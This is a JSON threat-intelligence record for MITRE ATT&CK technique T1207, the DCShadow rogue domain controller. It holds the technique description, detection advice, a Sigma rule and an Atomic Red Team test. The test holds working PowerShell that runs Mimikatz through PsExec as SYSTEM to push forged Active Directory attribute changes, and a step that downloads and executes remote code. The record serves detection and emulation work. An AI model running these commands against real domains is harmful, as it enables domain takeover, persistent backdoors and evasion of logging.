{
    "id": "T1207",
    "name": "Rogue Domain Controller",
    "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](T1134.005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
    "platforms": "Windows",
    "kill_chain_phases": "Defense Evasion",
    "data_sources": "Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Modification, Network Traffic: Network Traffic Content, User Account: User Account Authentication",
    "detection": "Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an attacker or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)\nLeverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)\nBaseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)\nInvestigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.",
    "url": "https://attack.mitre.org/techniques/T1207",
    "enrichments": {
        "attack_rule_map": [],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "b70627f7-3b43-4c6f-8fc0-c918c41f8f72",
                    "564998d8-ab3e-4123-93fb-eccaa6b9714a",
                    "32e19d25-4aed-4860-a55a-be99cb0bf7ed"
                ],
                "lookup_results": [
                    {
                        "uuid": "b70627f7-3b43-4c6f-8fc0-c918c41f8f72",
                        "lookup_data": {
                            "mitre-attack-id": "T1207",
                            "mitre-cti:description": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of AD design features. For example, mitigating specific AD API calls will likely have unintended side effects, such as preventing DC replication from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior.",
                            "mitre-cti:name": "DCShadow Mitigation",
                            "mitre-cti:type": "course-of-action",
                            "raw": "{'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'course-of-action--b70627f7-3b43-4c6f-8fc0-c918c41f8f72', 'type': 'course-of-action', 'created': '2018-10-17T00:14:20.652Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/mitigations/T1207', 'external_id': 'T1207'}], 'modified': '2019-07-24T14:23:59.683Z', 'name': 'DCShadow Mitigation', 'description': 'This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of AD design features. For example, mitigating specific AD API calls will likely have unintended side effects, such as preventing DC replication from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior.', 'x_mitre_deprecated': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "564998d8-ab3e-4123-93fb-eccaa6b9714a",
                        "lookup_data": {
                            "mitre-attack-id": "T1207",
                            "mitre-cti:description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
                            "mitre-cti:name": "Rogue Domain Controller",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Vincent Le Toux'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a', 'type': 'attack-pattern', 'created': '2018-04-18T17:59:24.739Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1207', 'url': 'https://attack.mitre.org/techniques/T1207'}, {'url': 'https://www.dcshadow.com/', 'description': 'Delpy, B. & LE TOUX, V. (n.d.). DCShadow. Retrieved March 20, 2018.', 'source_name': 'DCShadow Blog'}, {'url': 'https://adsecurity.org/?page_id=1821', 'description': 'Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015.', 'source_name': 'Adsecurity Mimikatz Guide'}, {'url': 'https://github.com/shellster/DCSYNCMonitor', 'description': 'Spencer S. (2018, February 22). DCSYNCMonitor. Retrieved March 30, 2018.', 'source_name': 'GitHub DCSYNCMonitor'}, {'url': 'https://msdn.microsoft.com/en-us/library/ms677626.aspx', 'description': 'Microsoft. (n.d.). Polling for Changes Using the DirSync Control. Retrieved March 30, 2018.', 'source_name': 'Microsoft DirSync'}, {'url': 'https://adds-security.blogspot.fr/2018/02/detecter-dcshadow-impossible.html', 'description': 'Lucand,G. (2018, February 18). Detect DCShadow, impossible?. Retrieved March 30, 2018.', 'source_name': 'ADDSecurity DCShadow Feb 2018'}], 'modified': '2022-03-08T21:20:04.850Z', 'name': 'Rogue Domain Controller', 'description': 'Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\\n\\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\\n\\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_detection': 'Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an adversary or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)\\n\\nLeverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)\\n\\nBaseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)\\n\\nInvestigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.', 'x_mitre_version': '2.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Active Directory: Active Directory Object Creation', 'User Account: User Account Authentication', 'Network Traffic: Network Traffic Content', 'Active Directory: Active Directory Object Modification'], 'x_mitre_defense_bypassed': ['Log analysis'], 'x_mitre_permissions_required': ['Administrator'], 'x_mitre_is_subtechnique': False}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "32e19d25-4aed-4860-a55a-be99cb0bf7ed",
                        "lookup_data": {
                            "description": "Detects DCShadow via create new SPN",
                            "raw": "author: Ilyas Ochkov, oscd.community, Chakib Gzenayi (@Chak092), Hosni Mribah\ndate: 2019/10/25\ndescription: Detects DCShadow via create new SPN\ndetection:\n  condition: 1 of selection*\n  selection1:\n    EventID: 4742\n    ServicePrincipalNames|contains: GC/\n  selection2:\n    AttributeLDAPDisplayName: servicePrincipalName\n    AttributeValue|startswith: GC/\n    EventID: 5136\nfalsepositives:\n- Valid on domain controllers; exclude known DCs\nid: 32e19d25-4aed-4860-a55a-be99cb0bf7ed\nlevel: medium\nlogsource:\n  definition: The \"Audit Directory Service Changes\" logging policy must be configured\n    in order to receive events. Audit events are generated only for objects with configured\n    system access control lists (SACLs). Audit events are generated only for objects\n    with configured system access control lists (SACLs) and only when accessed in\n    a manner that matches their SACL settings. This policy covers the following events\n    ids - 5136, 5137, 5138, 5139, 5141. Note that the default policy does not cover\n    User objects. For that a custom AuditRule need to be setup (See https://github.com/OTRF/Set-AuditRule)\n  product: windows\n  service: security\nmodified: 2022/10/17\nreferences:\n- https://twitter.com/gentilkiwi/status/1003236624925413376\n- https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2\n- https://blog.alsid.eu/dcshadow-explained-4510f52fc19d\nrelated:\n- id: 611eab06-a145-4dfa-a295-3ccc5c20f59a\n  type: derived\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1207\ntitle: Possible DC Shadow Attack\n",
                            "sigma:id": "32e19d25-4aed-4860-a55a-be99cb0bf7ed",
                            "title": "Possible DC Shadow Attack",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1207",
                "display_name": "Rogue Domain Controller",
                "atomic_tests": [
                    {
                        "name": "DCShadow (Active Directory)",
                        "auto_generated_guid": "0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6",
                        "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "object": {
                                "description": "Targeted object (for machine account do not forget to add final '$')",
                                "type": "string",
                                "default": "bruce.wayne"
                            },
                            "attribute": {
                                "description": "Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory...",
                                "type": "string",
                                "default": "badpwdcount"
                            },
                            "value": {
                                "description": "Value to assign to object attribute",
                                "type": "string",
                                "default": "9999"
                            },
                            "mimikatz_path": {
                                "description": "Mimikatz windows executable",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
                            },
                            "psexec_path": {
                                "description": "Path to PsExec",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
                                "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
                            },
                            {
                                "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
                                "prereq_command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
                                "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n"
                            }
                        ],
                        "executor": {
                            "name": "powershell",
                            "elevation_required": true,
                            "command": "# starting fake DC server, as SYSTEM (required)\n$dc_output_file = \"PathToAtomicsFolder\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\nRemove-Item $dc_output_file -ErrorAction Ignore\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam\"\n\n# wait for fake DC server to be ready...\nStart-Sleep -Seconds 5\n\n# server ready, so trigger replication (push) and wait until it finished\n& \"#{mimikatz_path}\" \"lsadump::dcshadow /push\" \"exit\"\n\nWrite-Host \"`nWaiting for fake DC server to return\"\nWait-Process $dc\n\nWrite-Host \"`nOutput from fake DC server:\"\nGet-Content $dc_output_file\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\nRemove-Item $dc_output_file -ErrorAction Ignore\n\nWrite-Host \"End of DCShadow\"\n",
                            "cleanup_command": "Stop-Process -Name \"mimikatz\" -Force -ErrorAction Ignore\n"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 14:00:19"
}